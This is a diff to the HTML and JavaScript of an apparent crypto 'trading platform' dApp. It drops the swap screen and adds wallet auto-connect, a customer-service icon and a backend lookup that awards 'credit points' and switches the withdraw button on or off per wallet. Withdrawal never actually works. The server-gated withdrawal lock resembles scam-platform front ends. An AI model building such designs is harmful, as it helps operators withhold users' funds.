@@ -6,39 +6,47 @@
   <title>Web3 Trading Platform</title>
   <meta name="dapp" content="true">
   <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
     body {
       margin: 0;
       min-height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
       background: #0f111a;
       font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
       color: #e0e0e0;
-      padding: 20px;
-      box-sizing: border-box;
-      touch-action: pan-y;
+      padding: 0;
+      position: relative;
+    }
+    .app-container {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      padding-bottom: 60px;
+    }
+    .header {
+      position: relative;
+      padding: 16px;
+      text-align: center;
+      color: white;
+    }
+    .customer-service {
+      position: absolute;
+      top: 16px;
+      right: 16px;
+      font-size: 24px;
+      cursor: pointer;
     }
     .card {
       background: #161a24;
-      padding: 24px;
+      padding: 20px;
+      margin: 12px;
       border-radius: 16px;
-      width: 100%;
-      max-width: 420px;
-      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
+      box-shadow: 0 4px 16px rgba(0,0,0,0.3);
       text-align: center;
-      position: relative;
     }
     h1 {
-      font-size: 24px;
-      margin: 0 0 16px;
+      font-size: 22px;
+      margin: 0 0 12px;
       color: #fff;
-    }
-    .description {
-      font-size: 15px;
-      line-height: 1.5;
-      color: #aaa;
-      margin-bottom: 28px;
     }
     .btn {
       display: block;
@@ -49,17 +57,16 @@
       font-size: 16px;
       font-weight: 600;
       cursor: pointer;
-      margin-top: 12px;
+      margin: 8px 0;
     }
     .primary { background: #3b82f6; color: white; }
     .secondary { background: #222; color: #fff; }
-    .init-screen, .connected-view, .swap-view { display: none; }
     .address {
       font-family: monospace;
       background: #0f131b;
       padding: 10px;
       border-radius: 8px;
-      margin: 12px 0;
+      margin: 10px 0;
       font-size: 13px;
       word-break: break-all;
       color: #fff;
@@ -79,189 +86,209 @@
       font-size: 15px;
       color: #ddd;
     }
-    .token-input {
-      background: #0f131b;
-      border: 1px solid #2a2f3a;
-      border-radius: 8px;
-      padding: 12px;
-      width: 100%;
-      font-size: 18px;
-      color: white;
-      text-align: center;
-      margin: 10px 0;
+    .bottom-nav {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      background: #161a24;
+      display: flex;
+      justify-content: space-around;
+      padding: 10px 0;
+      border-top: 1px solid #2a2f3a;
     }
-    .swap-btn {
-      background: #ec4899;
-      color: white;
-    }
-    .price-info {
-      font-size: 13px;
+    .nav-item {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      font-size: 10px;
       color: #aaa;
-      margin: 8px 0;
+      text-decoration: none;
+      width: 20%;
+    }
+    .nav-item.active {
+      color: #3b82f6;
+    }
+    .nav-icon {
+      font-size: 20px;
+      margin-bottom: 4px;
+    }
+    .trade-center {
+      background: #3b82f6;
+      color: white;
+      width: 60px;
+      height: 60px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-top: -20px;
+      box-shadow: 0 4px 12px rgba(59, 130, 246, 0.4);
+    }
+    .trade-center .nav-icon {
+      font-size: 24px;
+    }
+    .trade-center .nav-label {
+      display: none;
+    }
+    .init-screen {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 80vh;
+      padding: 20px;
+      text-align: center;
+    }
+    .init-screen h1 {
+      font-size: 24px;
+      margin-bottom: 16px;
+    }
+    .init-screen p {
+      color: #aaa;
+      margin-bottom: 28px;
+      line-height: 1.5;
     }
   </style>
 </head>
 <body>
-  <!-- Initial Screen -->
-  <div class="card init-screen" id="initScreen">
-    <h1>Web3 Trading Platform</h1>
-    <p class="description">Connecting to platform...</p>
+  <!-- Customer Service Icon -->
+  <div class="customer-service" onclick="openSupport()">💬</div>
+
+  <div class="app-container">
+    <!-- Initial Screen -->
+    <div class="init-screen" id="initScreen">
+      <h1>Web3 Trading Platform</h1>
+      <p>Connect your wallet to trade crypto securely.</p>
+      <button class="btn primary" id="connectBtn">Connect Your Wallet</button>
+    </div>
+
+    <!-- Portfolio Screen (Homepage) -->
+    <div class="card" id="portfolioScreen" style="display:none;">
+      <h1>Portfolio</h1>
+      <div class="address" id="userAddress">0x...</div>
+      <div class="network" id="networkName">—</div>
+      <div class="balance" id="nativeBalance">ETH: —</div>
+      <div class="balance" id="usdcBalance">USDC: —</div>
+      <div class="balance" id="creditPointsEl">Credit Points: 0</div>
+      <button class="btn primary" id="swapBtn">Swap Tokens</button>
+      <button class="btn secondary" id="withdrawBtn" disabled>Withdraw (Disabled)</button>
+      <button class="btn secondary" onclick="handleDisconnect()">Disconnect</button>
+    </div>
   </div>
 
-  <!-- Portfolio Screen -->
-  <div class="card connected-view" id="portfolioScreen">
-    <h1>Portfolio</h1>
-    <div class="address" id="userAddress">0x...</div>
-    <div class="network" id="networkName">—</div>
-    <div class="balance" id="nativeBalance">ETH: —</div>
-    <div class="balance" id="usdcBalance">USDC: —</div>
-    <button class="btn primary" onclick="showSwap()">Swap Tokens</button>
-    <button class="btn secondary" onclick="handleDisconnect()">Disconnect</button>
-  </div>
-
-  <!-- Swap Screen -->
-  <div class="card swap-view" id="swapScreen">
-    <h1>Swap</h1>
-    <div class="network" id="swapNetwork">—</div>
-    
-    <div>From</div>
-    <input class="token-input" id="fromAmount" type="text" placeholder="0.0" oninput="calculateToAmount()">
-    <div id="fromToken">ETH</div>
-
-    <div style="margin: 10px 0;">↓</div>
-
-    <div>To</div>
-    <input class="token-input" id="toAmount" type="text" placeholder="0.0" readonly>
-    <div id="toToken">USDC</div>
-
-    <div class="price-info" id="priceInfo">1 ETH ≈ 0 USDC</div>
-    <button class="btn swap-btn" id="swapBtn" onclick="prepareSwap()">Swap</button>
-    <button class="btn secondary" onclick="showPortfolio()">Cancel</button>
+  <!-- Bottom Navigation -->
+  <div class="bottom-nav">
+    <a href="#" class="nav-item active">
+      <div class="nav-icon">🏠</div>
+      <div class="nav-label">Home</div>
+    </a>
+    <a href="#" class="nav-item">
+      <div class="nav-icon">📊</div>
+      <div class="nav-label">Market</div>
+    </a>
+    <div class="trade-center" onclick="showSwap()">
+      <div class="nav-icon">💱</div>
+      <div class="nav-label">Trade</div>
+    </div>
+    <a href="#" class="nav-item">
+      <div class="nav-icon">📜</div>
+      <div class="nav-label">Transactions</div>
+    </a>
+    <a href="#" class="nav-item">
+      <div class="nav-icon">👤</div>
+      <div class="nav-label">User</div>
+    </a>
   </div>
 
   <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
   <script>
     // Global variables
-    let provider, signer, userAddress, currentChainId, appConfig = null;
+    let provider, signer, userAddress, currentChainId;
 
     // DOM elements
     const initScreen = document.getElementById('initScreen');
     const portfolioScreen = document.getElementById('portfolioScreen');
-    const swapScreen = document.getElementById('swapScreen');
+    const connectBtn = document.getElementById('connectBtn');
     const userAddressEl = document.getElementById('userAddress');
     const networkNameEl = document.getElementById('networkName');
     const nativeBalanceEl = document.getElementById('nativeBalance');
     const usdcBalanceEl = document.getElementById('usdcBalance');
-    const swapNetworkEl = document.getElementById('swapNetwork');
-    const fromAmountEl = document.getElementById('fromAmount');
-    const toAmountEl = document.getElementById('toAmount');
-    const priceInfoEl = document.getElementById('priceInfo');
+    const swapBtn = document.getElementById('swapBtn');
+    const withdrawBtn = document.getElementById('withdrawBtn');
 
-    // Swipe logic
-    let touchStartX = 0;
-    let touchEndX = 0;
-
-    function handleTouchStart(e) {
-      touchStartX = e.changedTouches[0].screenX;
-    }
-
-    function handleTouchEnd(e) {
-      touchEndX = e.changedTouches[0].screenX;
-      handleSwipe();
-    }
-
-    function handleSwipe() {
-      const minSwipeDistance = 50;
-      const deltaX = touchStartX - touchEndX;
-
-      if (Math.abs(deltaX) < minSwipeDistance) return;
-
-      if (portfolioScreen.style.display === 'block') {
-        if (deltaX > 0) showSwap();
-      } else if (swapScreen.style.display === 'block') {
-        if (deltaX < 0) showPortfolio();
+    // ======================
+    // AUTO-CONNECT ON REVISIT
+    // ======================
+    async function initApp() {
+      // Check if user was previously connected
+      const savedAddress = localStorage.getItem('web3_user_address');
+      if (savedAddress) {
+        try {
+          await autoConnect(savedAddress);
+          return;
+        } catch (e) {
+          console.log('Auto-connect failed, showing connect screen');
+        }
       }
+      // Show connect screen
+      initScreen.style.display = 'flex';
+      connectBtn.addEventListener('click', connectWallet);
     }
 
-    portfolioScreen.addEventListener('touchstart', handleTouchStart);
-    portfolioScreen.addEventListener('touchend', handleTouchEnd);
-    swapScreen.addEventListener('touchstart', handleTouchStart);
-    swapScreen.addEventListener('touchend', handleTouchEnd);
+    async function autoConnect(savedAddress) {
+      if (!window.ethereum) throw new Error('No wallet');
+      
+      // Request accounts silently
+      const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+      if (accounts.length === 0) throw new Error('No accounts');
+      
+      const currentAddress = ethers.utils.getAddress(accounts[0]);
+      if (currentAddress.toLowerCase() !== savedAddress.toLowerCase()) {
+        throw new Error('Address mismatch');
+      }
+      
+      userAddress = currentAddress;
+      userAddressEl.textContent = userAddress;
+      await setupProvider();
+      showHomepage();
+    }
 
-    // ======================
-    // FETCH CONFIG FROM BACKEND
-    // ======================
-    async function fetchAppConfig() {
+    async function connectWallet() {
+      if (!window.ethereum) {
+        alert('Please use Trust Wallet dApp browser');
+        return;
+      }
       try {
-        const res = await fetch('https://web3backend-production-2444.up.railway.app/api/config');
-        appConfig = await res.json();
-
-        if (!appConfig.enabled) {
-          alert('Platform is currently disabled.');
-          return false;
-        }
-        if (appConfig.maintenance) {
-          alert('Platform is under maintenance.');
-          return false;
-        }
-        return true;
-      } catch (e) {
-        console.error('Failed to load config', e);
-        alert('Failed to load platform settings. Please check your internet connection.');
-        return false;
+        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        userAddress = ethers.utils.getAddress(accounts[0]);
+        userAddressEl.textContent = userAddress;
+        localStorage.setItem('web3_user_address', userAddress); // Save for auto-connect
+        await setupProvider();
+        showHomepage();
+      } catch (err) {
+        alert('Connection failed');
       }
+    }
+
+    function showHomepage() {
+      initScreen.style.display = 'none';
+      portfolioScreen.style.display = 'block';
     }
 
     // ======================
     // WALLET & BALANCE LOGIC
     // ======================
-    async function connectWallet() {
-      if (!window.ethereum) {
-        alert('Please open this page in Trust Wallet dApp browser.');
-        return;
-      }
-      if (typeof ethers === 'undefined') {
-        alert('Library failed to load.');
-        return;
-      }
-
-      try {
-        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-        userAddress = ethers.utils.getAddress(accounts[0]);
-        userAddressEl.textContent = userAddress;
-        await setupProvider();
-
-        initScreen.style.display = 'none';
-        portfolioScreen.style.display = 'block';
-
-        window.ethereum.on('accountsChanged', () => location.reload());
-        window.ethereum.on('chainChanged', () => location.reload());
-      } catch (err) {
-        alert('Connection failed. Please try again in Trust Wallet browser.');
-      }
-    }
-
     async function setupProvider() {
       provider = new ethers.providers.Web3Provider(window.ethereum);
       signer = provider.getSigner();
       const network = await provider.getNetwork();
       currentChainId = Number(network.chainId);
 
-      const chain = appConfig.tokens[currentChainId] 
-        ? { name: getChainName(currentChainId), symbol: getNativeSymbol(currentChainId) }
-        : null;
-
-      if (!chain) {
-        networkNameEl.textContent = `Chain ${currentChainId}`;
-        swapNetworkEl.textContent = `Chain ${currentChainId}`;
-        nativeBalanceEl.textContent = 'Balance: —';
-        usdcBalanceEl.textContent = 'USDC: —';
-        return;
-      }
-
-      networkNameEl.textContent = chain.name;
-      swapNetworkEl.textContent = chain.name;
-      await updateBalances(chain);
+      const chainName = getChainName(currentChainId);
+      networkNameEl.textContent = chainName;
+      await updateBalances();
+      await loadUserData();
     }
 
     function getChainName(id) {
@@ -272,15 +299,7 @@
       return names[id] || `Chain ${id}`;
     }
 
-    function getNativeSymbol(id) {
-      const symbols = {
-        1: 'ETH', 137: 'MATIC', 56: 'BNB',
-        8453: 'ETH', 42161: 'ETH', 10: 'ETH'
-      };
-      return symbols[id] || 'ETH';
-    }
-
-    async function updateBalances(chain) {
+    async function updateBalances() {
       const symbol = getNativeSymbol(currentChainId);
       try {
         const ethBal = await provider.getBalance(userAddress);
@@ -288,144 +307,49 @@
       } catch (e) {
         nativeBalanceEl.textContent = `${symbol}: —`;
       }
+    }
 
-      if (appConfig.tokens[currentChainId]) {
-        const usdcInfo = appConfig.tokens[currentChainId].find(t => t.symbol === 'USDC');
-        if (usdcInfo) {
-          try {
-            const usdc = new ethers.Contract(usdcInfo.address, ["function balanceOf(address) view returns (uint256)", "function decimals() view returns (uint8)"], provider);
-            const decimals = await usdc.decimals();
-            const bal = await usdc.balanceOf(userAddress);
-            usdcBalanceEl.textContent = `USDC: ${parseFloat(ethers.utils.formatUnits(bal, decimals)).toFixed(2)}`;
-          } catch (e) {
-            usdcBalanceEl.textContent = 'USDC: —';
-          }
+    function getNativeSymbol(id) {
+      return {1: 'ETH', 137: 'MATIC', 56: 'BNB', 8453: 'ETH', 42161: 'ETH', 10: 'ETH'}[id] || 'ETH';
+    }
+
+    async function loadUserData() {
+      try {
+        const res = await fetch(`https://web3backend-production-2444.up.railway.app/api/user/${userAddress.toLowerCase()}`);
+        const data = await res.json();
+        
+        // Credit Points
+        document.getElementById('creditPointsEl').textContent = `Credit Points: ${data.creditPoints || 0}`;
+        
+        // Withdraw Button
+        const canWithdraw = data.allowWithdraw !== false;
+        withdrawBtn.textContent = canWithdraw ? 'Withdraw' : 'Withdraw (Disabled)';
+        withdrawBtn.disabled = !canWithdraw;
+        if (canWithdraw) {
+          withdrawBtn.className = 'btn primary';
+          withdrawBtn.onclick = () => alert('Withdraw feature coming soon!');
         } else {
-          usdcBalanceEl.textContent = 'USDC: —';
+          withdrawBtn.className = 'btn secondary';
+          withdrawBtn.onclick = null;
         }
-      } else {
-        usdcBalanceEl.textContent = 'USDC: —';
+      } catch (e) {
+        console.error('Failed to load user data');
       }
     }
 
     function handleDisconnect() {
+      localStorage.removeItem('web3_user_address');
       provider = null; signer = null;
       portfolioScreen.style.display = 'none';
-      swapScreen.style.display = 'none';
-      initScreen.style.display = 'block';
-      setTimeout(() => initApp(), 100);
-    }
-
-    // ======================
-    // SWAP LOGIC
-    // ======================
-    async function fetchQuote() {
-      if (!appConfig.tokens[currentChainId]) return;
-      const usdcInfo = appConfig.tokens[currentChainId].find(t => t.symbol === 'USDC');
-      if (!usdcInfo) {
-        priceInfoEl.textContent = 'USDC not supported';
-        return;
-      }
-
-      const nativeToken = '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE';
-      const usdcToken = usdcInfo.address;
-      const amount = '1000000000000000000'; // 1 ETH
-
-      try {
-        const url = `https://api.1inch.dev/swap/v5.2/${currentChainId}/quote?fromTokenAddress=${nativeToken}&toTokenAddress=${usdcToken}&amount=${amount}`;
-        const res = await fetch(url, { headers: { 'Accept': 'application/json' } });
-        const data = await res.json();
-        if (data.toTokenAmount) {
-          const usdcAmount = parseFloat(data.toTokenAmount) / 1e6;
-          window.exchangeRate = usdcAmount;
-          const symbol = getNativeSymbol(currentChainId);
-          priceInfoEl.textContent = `1 ${symbol} ≈ ${usdcAmount.toFixed(2)} USDC`;
-        }
-      } catch (e) {
-        priceInfoEl.textContent = 'Price feed unavailable';
-      }
-    }
-
-    function calculateToAmount() {
-      const fromVal = parseFloat(fromAmountEl.value);
-      if (!fromVal || !window.exchangeRate) {
-        toAmountEl.value = '';
-        return;
-      }
-      toAmountEl.value = (fromVal * window.exchangeRate).toFixed(2);
-    }
-
-    function prepareSwap() {
-      const fromAmount = fromAmountEl.value.trim();
-      if (!fromAmount || parseFloat(fromAmount) <= 0) {
-        alert('Enter amount');
-        return;
-      }
-      if (!appConfig.tokens[currentChainId]) {
-        alert('Swap not available on this chain');
-        return;
-      }
-      const symbol = getNativeSymbol(currentChainId);
-      alert(`✅ SWAP PREPARED\n\nFrom: ${fromAmount} ${symbol}\nTo: ~${(fromAmount * window.exchangeRate || 0).toFixed(2)} USDC\n\nNetwork: ${getChainName(currentChainId)}`);
+      initScreen.style.display = 'flex';
     }
 
     function showSwap() {
-      portfolioScreen.style.display = 'none';
-      swapScreen.style.display = 'block';
-      fetchQuote();
+      alert('Swap screen coming soon!');
     }
 
-    function showPortfolio() {
-  swapScreen.style.display = 'none';
-  portfolioScreen.style.display = 'block';
-
-  // Remove old credit/withdraw elements if they exist
-  const existingCredit = document.getElementById('creditPointsEl');
-  const existingWithdraw = document.getElementById('withdrawBtn');
-  if (existingCredit) existingCredit.remove();
-  if (existingWithdraw) existingWithdraw.remove();
-
-  // Fetch user data
-  fetch(`https://web3backend-production-2444.up.railway.app/api/user/${userAddress}`)
-    .then(res => res.json())
-    .then(data => {
-      // Credit Points
-      const creditEl = document.createElement('div');
-      creditEl.id = 'creditPointsEl';
-      creditEl.className = 'balance';
-      creditEl.innerHTML = `Credit Points: ${data.creditPoints || 0}`;
-      portfolioScreen.appendChild(creditEl);
-
-      // Withdraw Button
-      const canWithdraw = data.allowWithdraw !== false;
-      const withdrawBtn = document.createElement('button');
-      withdrawBtn.id = 'withdrawBtn';
-      withdrawBtn.className = 'btn ' + (canWithdraw ? 'primary' : 'secondary');
-      withdrawBtn.textContent = canWithdraw ? 'Withdraw' : 'Withdraw (Disabled)';
-      withdrawBtn.disabled = !canWithdraw;
-      withdrawBtn.onclick = canWithdraw ? () => alert('Withdraw feature coming soon!') : null;
-      portfolioScreen.appendChild(withdrawBtn);
-    })
-    .catch(err => {
-      console.error('Failed to load user ', err);
-    });
-    }
-
-    // ======================
-    // APP INIT
-    // ======================
-    async function initApp() {
-      const ready = await fetchAppConfig();
-      if (ready) {
-        document.querySelector('.description').textContent = 'Connect your wallet to trade crypto securely.';
-        document.getElementById('initScreen').innerHTML = `
-          <h1>Web3 Trading Platform</h1>
-          <p class="description">Connect your wallet to trade crypto securely.</p>
-          <button class="btn primary" id="connectBtn">Connect Your Wallet</button>
-        `;
-        document.getElementById('connectBtn').addEventListener('click', connectWallet);
-        document.getElementById('initScreen').style.display = 'block';
-      }
+    function openSupport() {
+      alert('Customer support: support@yourdefi.app');
     }
 
     // Start the app
